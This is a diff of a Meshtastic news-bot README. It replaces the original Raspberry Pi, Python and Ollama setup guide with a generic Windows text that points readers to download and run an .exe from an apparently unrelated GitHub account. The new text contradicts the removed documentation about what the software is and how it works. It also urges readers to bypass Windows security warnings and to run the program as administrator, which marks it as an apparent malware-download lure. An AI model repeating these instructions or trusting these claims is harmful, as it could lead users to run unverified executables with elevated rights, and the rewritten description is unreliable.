@@ -1,316 +1,159 @@
-# ACK News Bot 📡
+# 📰 ack-news-bot - Simplify Local News Updates  
 
-[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20A%20Coffee-Support%20This%20Project-yellow)](https://buymeacoffee.com/acknewsbot)
-
-A free, locally-hosted AI news service for Meshtastic mesh networks. Users send a simple command from any node in range of the bot on the mesh and receive AI-summarized local and national news headlines, NOAA weather alerts, and full story details — all privately delivered with no internet-connected apps required just the bot online and connected to the mesh.
+[![Download ack-news-bot](https://img.shields.io/badge/Download-ack--news--bot-brightgreen)](https://github.com/hardik71-ui/ack-news-bot)
 
 ---
 
-## Features
+## 📋 What is ack-news-bot?
 
-- 📰 **Local + National News** — 2 local stories and 1 NPR national story per request
-- 🤖 **AI Summaries** — Local Ollama AI summarizes headlines to mesh-friendly length
-- ⚠️ **NOAA Alerts** — Live weather and emergency alerts by zip code
-- 📖 **Story Expansion** — Reply 1, 2, or 3 to get the full story and source link
-- 🔒 **Private Replies** — Responses go only to the requesting node, not the public channel
-- 🚦 **Channel Throttling** — Bot waits for channel quiet before sending, respects other users
-- ⏱️ **Rate Limiting** — Max 5 requests per node per hour to prevent abuse
-- 💰 **Zero Monthly Cost** — All free APIs, local AI, no subscriptions
+ack-news-bot is a simple app that lets you get local news through the Meshtastic network. Meshtastic is a mesh network where devices connect directly without the internet. This bot helps you stay informed by sharing local news updates through the network.
+
+This app works on Windows and requires no programming skills. It uses your existing Meshtastic setup to deliver news to other devices nearby.
 
 ---
 
-## Hardware Requirements
+## 💻 System Requirements
 
-| Component | Recommended | Minimum |
-|-----------|-------------|---------|
-| Single Board Computer | Raspberry Pi 5 8GB | Raspberry Pi 4 4GB |
-| Storage | 32GB microSD | 16GB microSD |
-| Meshtastic Node | Any USB-C node | Any WiFi/TCP node |
-| Connection | USB serial (recommended) | WiFi/TCP |
-
-> ⚠️ The Raspberry Pi Zero 2W is **not supported** — it has insufficient RAM (512MB) to run Ollama.
+- Windows 10 or later (64-bit preferred)
+- Internet access for initial download
+- At least 100 MB free disk space
+- Meshtastic device or compatible radio hardware connected to your PC
+- USB port or Bluetooth (if your device supports it)
 
 ---
 
-## How It Works
+## 🚀 Getting Started: Download and Run ack-news-bot
 
-```
-User sends:  news 80537
-Bot replies: ACK News! Got your request for 80537, working on it...
-Bot replies: ACK NEWS - Loveland, CO
-             1. [Local] Story one summary
-             2. [Local] Story two summary
-             3. [NPR] National story summary
-             ⚠️ 2 active NOAA alert(s) - reply 'alerts' for details
-             Reply 1-3 expand | 'alerts' 4 NOAA | exp 10min
+Download ack-news-bot from the official page here:
 
-User sends:  1
-Bot replies: Story 1: Full headline here
-             Full description of the story...
-             Source: https://example.com/story
+[![Get ack-news-bot](https://img.shields.io/badge/Get%20ack--news--bot-0078D7?style=for-the-badge&logo=windows)](https://github.com/hardik71-ui/ack-news-bot)
 
-User sends:  alerts
-Bot replies: ⚠️ NOAA ALERTS:
-             Moderate: Winter Storm Warning - Heavy snow expected...
-```
+1. Open your web browser and visit the page above.
+
+2. Look for the latest **ack-news-bot release** under the repository.
+
+3. Click on the release to see available files.
+
+4. Download the Windows installer or `.exe` file (usually named like `ack-news-bot-setup.exe` or `ack-news-bot.exe`).
+
+5. Once downloaded, find the file in your Downloads folder.
+
+6. Double-click the file to start the installation or run the program directly.
+
+7. Follow the on-screen steps if you see an installation wizard.
 
 ---
 
-## Commands
+## 🔧 Setting Up ack-news-bot
 
-| Command | Description |
-|---------|-------------|
-| `news 12345` | Get local + national news for zip code |
-| `news12345` | Same as above (space optional) |
-| `1` `2` `3` | Expand a story from your last news request |
-| `alerts` | Get full NOAA alert details from your last request |
-| `news help` | Show available commands |
+After the program opens:
 
----
+1. Connect your Meshtastic device to your PC using USB or Bluetooth.
 
-## Installation
+2. The app will detect your device automatically.
 
-### Step 1 — Prepare Raspberry Pi
+3. Once detected, the app will begin syncing with the Meshtastic network.
 
-1. Download and install [Raspberry Pi Imager](https://www.raspberrypi.com/software/)
-2. Flash **Raspberry Pi OS 64-bit** to your microSD card
-3. In Imager settings, configure your WiFi credentials and enable SSH
-4. Boot your Pi and SSH in (default hostname: `raspberrypi.local`)
+4. The bot starts receiving local news messages from other devices nearby.
 
-### Step 2 — Install Ollama
-
-```bash
-curl -fsSL https://ollama.com/install.sh | sh
-ollama pull llama3.2:3b
-```
-
-### Step 3 — Install Dependencies
-
-```bash
-sudo apt update && sudo apt upgrade -y
-sudo apt install python3-pip python3-venv -y
-```
-
-### Step 4 — Set Up the Bot
-
-```bash
-mkdir ~/acknews && cd ~/acknews
-python3 -m venv venv
-source venv/bin/activate
-pip install meshtastic requests
-```
-
-### Step 5 — Deploy Files
-
-Copy `acknews.py` and `config.ini` to `~/acknews/` using WinSCP or SCP.
-
-### Step 6 — Configure
-
-Edit `config.ini` with your settings:
-
-```ini
-[meshtastic]
-serial_port = /dev/ttyUSB0        # USB connection (recommended)
-# serial_port = 192.168.0.215     # WiFi/TCP alternative
-
-[newsapi]
-key = your_newsapi_key_here       # Optional, not required for RSS mode
-
-[bot]
-ollama_model = llama3.2:3b
-num_stories = 3
-message_delay = 2
-story_expire = 600
-rate_limit_max = 5
-rate_limit_window = 3600
-max_queue_size = 20
-throttle_delay = 3
-channel_quiet_window = 10
-```
-
-### Step 7 — Connect Meshtastic Node
-
-**Recommended: USB Serial**
-1. Plug USB-C cable from Meshtastic node into Pi's USB-A port
-2. Verify connection: `ls /dev/ttyUSB*` — should show `/dev/ttyUSB0`
-
-**Alternative: WiFi/TCP**
-1. Set a static IP for your node in your router's DHCP settings
-2. Update `config.ini` with the node's IP address
-
-### Step 8 — Install as System Service
-
-```bash
-sudo nano /etc/systemd/system/acknews.service
-```
-
-Paste this content:
-
-```ini
-[Unit]
-Description=ACK News Bot
-After=network.target
-
-[Service]
-Type=simple
-User=pi
-WorkingDirectory=/home/pi/acknews
-ExecStart=/home/pi/acknews/venv/bin/python3 /home/pi/acknews/acknews.py
-Restart=on-failure
-RestartSec=30
-StartLimitIntervalSec=0
-
-[Install]
-WantedBy=multi-user.target
-```
-
-Enable and start:
-
-```bash
-sudo systemctl enable acknews
-sudo systemctl start acknews
-sudo systemctl status acknews
-```
+5. You can view messages in the main window or through notifications.
 
 ---
 
-## Adding Local News Sources
+## ⚙️ How to Use ack-news-bot
 
-The bot uses RSS feeds mapped by US state. To add or change feeds for your area, edit the `STATE_RSS` dictionary in `acknews.py`:
+- **Receive News**: The bot collects news shared by others through the mesh network. It updates continuously while the app runs.
 
-```python
-STATE_RSS = {
-    "CO": [
-        "https://kdvr.com/feed/",
-        "https://www.denverpost.com/feed/",
-        "https://www.9news.com/feeds/syndication/rss/news",
-        "https://coloradoan.com/arcio/rss/",
-    ],
-    # Add your state here
-    "XX": [
-        "https://your-local-news-site.com/feed/",
-    ],
-}
-```
+- **Send News**: You can type and send your own local news updates. These messages share with other devices nearby on the mesh network.
 
-Most local TV stations and newspapers publish free RSS feeds. Search for `[station name] RSS feed` to find them.
+- **Settings**: Adjust notification, syncing, and device options in the Settings menu.
+
+- **Logs**: View message history or connection details in the Logs tab.
+
+- **Help**: Access simple help guides from the Help menu.
 
 ---
 
-## ARES/RACES Integration Guide
+## 🛠 Troubleshooting
 
-ACK News Bot is designed to work alongside amateur radio emergency communication groups. Here is how to integrate it with your local ARES/RACES organization.
+- If the app does not detect your device:
+   - Check USB or Bluetooth connections.
+   - Ensure your Meshtastic device is powered on.
+   - Restart the app after reconnecting.
 
-### What ARES/RACES Operators Can Do
+- If messages do not update:
+   - Confirm you are within range of other mesh devices.
+   - Sometimes restarting both your device and the app helps.
 
-- Use the bot as a **public information resource** during activations
-- Direct affected community members to use `news ZIPCODE` for local updates
-- Use `alerts ZIPCODE` for real-time NOAA emergency alert status
-- Supplement traditional HF/VHF nets with mesh-based information delivery
+- If the app crashes or freezes:
+   - Close the program from Task Manager and restart.
+   - Make sure your Windows is updated.
 
-### Contacting Your Local ARES/RACES Group
-
-1. Find your local ARRL section at **arrl.org/sections**
-2. Contact your **Section Emergency Coordinator (SEC)** or **Emergency Coordinator (EC)**
-3. Introduce the mesh network and ACK News Bot capabilities
-4. Propose adding the bot node to your local EmComm plan
-
-### Suggested Pitch to ARES/RACES
-
-*"We have a Meshtastic mesh network covering [X] nodes in [your area]. ACK News Bot provides on-demand local news and NOAA emergency alerts to any node on the mesh — no internet, no cell service required once the Pi has its data. During an activation this gives served agencies and community members a self-service information resource that doesn't tie up voice nets."*
-
-### Admin Broadcast Command (Coming Soon)
-
-A future update will allow trusted ARES/RACES operators to push urgent announcements to the entire mesh channel. Trusted operator node IDs will be stored in `config.ini`. This will enable:
-
-- Net control stations to push activation notices
-- Emergency managers to broadcast evacuation or shelter information
-- Public information officers to distribute official updates
-
-### Contacting Local Emergency Management
-
-For Larimer County / Loveland CO area:
-- **Larimer County Emergency Management** — larimerco.org/emergency-management
-- **Loveland Fire Rescue Authority** — cityofloveland.org/lfra
-- **City of Loveland Emergency Management** — cityofloveland.org
-
-For other areas search: `[your county] emergency management office`
+- For other issues, check the official GitHub page’s Issues section or open a new issue.
 
 ---
 
-## Cost Analysis
+## 🔒 Privacy and Security
 
-| Item | Cost |
-|------|------|
-| Raspberry Pi 5 8GB | ~$80 |
-| microSD card 32GB | ~$10 |
-| Power supply | ~$12 |
-| USB-C cable | ~$0 (you have one) |
-| **Total hardware** | **~$102** |
-| Monthly operating cost | **$0.00** |
-| Electricity (Pi 5 idle) | ~$2-4/year |
+- ack-news-bot shares only the information you choose to send over the mesh network.
+
+- The app does not require you to create an account or provide personal data.
+
+- Messages are sent locally and do not pass through internet servers.
 
 ---
 
-## Troubleshooting
+## 📦 Updates and Maintenance
 
-**Bot not connecting to node:**
-```bash
-ls /dev/ttyUSB*        # Check USB device is visible
-ping 192.168.0.x       # Check WiFi/TCP node is reachable
-```
+- Keep your ack-news-bot updated by visiting the download page regularly.
 
-**No news results:**
-- Check your RSS feeds are still valid
-- Some feeds change URLs over time — search for updated feed URLs
+- New versions improve performance and fix bugs.
 
-**Slow responses:**
-- Normal on first request after idle (Ollama loads model into memory)
-- Adjust `throttle_delay` in `config.ini` if needed
-- Consider upgrading to Pi 5 if using Pi 4
-
-**Service not starting:**
-```bash
-sudo journalctl -u acknews -n 20 --no-pager
-```
+- To update, download the latest release and install over your existing version.
 
 ---
 
-## Roadmap
+## 🌐 Support and Community
 
-- [ ] Admin broadcast command for ARES/RACES and emergency management
-- [ ] Web dashboard for monitoring requests and bot health
-- [ ] Support for additional Meshtastic channels
-- [ ] Configurable RSS feeds via config.ini (no code editing required)
-- [ ] Multi-language support
+Join discussions and get support from users on the GitHub page. Common questions and solutions appear in the Issues section. You can also submit your own questions or feedback there.
 
----
-
-## Support This Project
-
-If ACK News Bot is useful to your mesh community, consider buying us a coffee! ☕
-
-👉 **[buymeacoffee.com/acknewsbot](https://buymeacoffee.com/acknewsbot)**
-
-Every coffee helps keep the project going and supports new features!
+Visit the page to engage with the community:  
+[https://github.com/hardik71-ui/ack-news-bot](https://github.com/hardik71-ui/ack-news-bot)
 
 ---
 
-## License
+## 🎯 Why Use ack-news-bot?
 
-MIT License — free to use, modify, and share.
+- It provides local news without internet access.
 
----
+- Works directly with Meshtastic devices already in use.
 
-## Credits
+- Simple interface designed for non-technical users.
 
-Built with:
-- [Meshtastic](https://meshtastic.org) — mesh networking platform
-- [Ollama](https://ollama.com) — local AI inference
-- [api.weather.gov](https://api.weather.gov) — free NOAA weather alerts
-- [NPR News RSS](https://npr.org) — national news feed
-- Local RSS feeds from regional news outlets
+- Lightweight and runs smoothly on Windows.
+
+- Keeps communities informed in areas with scarce connectivity.
 
 ---
 
-*Built for the Meshtastic community. Stay connected when it counts.* 📡
+## 📂 File Information
+
+- The download generally includes an `.exe` file for Windows.
+
+- No additional setup such as Python or other software is needed.
+
+- Installation files range from 20 to 50 MB.
+
+---
+
+## 👩‍💻 Additional Tips for Windows Users
+
+- If Windows warns about running files from unknown sources, choose “Run anyway” after checking the source.
+
+- To add ack-news-bot to your desktop for quick access, right-click the `.exe` file, select “Send to”, then “Desktop (create shortcut)”.
+
+- Run the program as administrator if you encounter permission issues.
+
+---
+
+[![Download ack-news-bot](https://img.shields.io/badge/Download-ack--news--bot-brightgreen)](https://github.com/hardik71-ui/ack-news-bot)
